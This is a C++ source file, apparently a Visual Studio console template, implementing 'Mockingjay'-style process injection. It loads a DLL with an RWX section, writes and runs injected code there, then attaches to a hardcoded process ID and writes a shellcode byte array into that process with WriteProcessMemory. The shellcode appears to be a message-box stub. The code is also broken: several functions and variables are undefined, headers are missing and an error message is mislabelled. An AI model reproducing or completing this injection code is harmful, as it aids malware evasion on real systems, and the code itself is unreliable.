// mockingjay_process_injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>

int main(int argc, char* argv[])
{
    // Load the vulnerable DLL
    HMODULE hDll = ::LoadLibraryW(L"path_to_vulnerable_dll");

    if (hDll == nullptr) {
        // fail
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(
        ::GetCurrentProcess(),
        hDll,
        &moduleInfo,
        sizeof(MODULEINFO))
        ) {
        // fail
    }

    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET);

    // Write the injected code to the RWX section
    WriteCodeToSection(rwxSectionAddr, injectedCode);

    // Execute the injected code
    ExecuteCodeFromSection(rwxSectionAddr);

    // Create SectionDescriptor structure
    SectionDescriptor descriptor = SectionDescriptor{
        rwxSectionAddr,
        (LPVOID)((PBYTE)rwxSectionAddr + RWX_SECTION_SIZE)
    };

    unsigned char buf[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
        "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e"
        "\x4c\x8d\x85\x0b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
        "\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x4a\x4f\x45\x53\x21\x00"
        "\x41\x6c\x65\x72\x74\x00";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE,
        pi.dwProcessId);
    if (hProcess == nullptr) {
        printf("[x] ReadProcessMemory failed with status 0x%x\n",
            ::GetLastError());
        return 1;
    }

    if (!DebugActiveProcess(4236)) {
        printf("[x] DebugActiveProcess failed with status 0x%x\n",
            ::GetLastError());
        ::CloseHandle(hProcess);  return 1;
    }  SIZE_T bytesWritten = 0;

    if (!WriteProcessMemory(hProcess, (LPVOID)0x21022D120, buf,
        sizeof(buf), &bytesWritten)) {
        printf("[x] WriteProcessMemory failed with status 0x%x\n",
            ::GetLastError());
    }
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
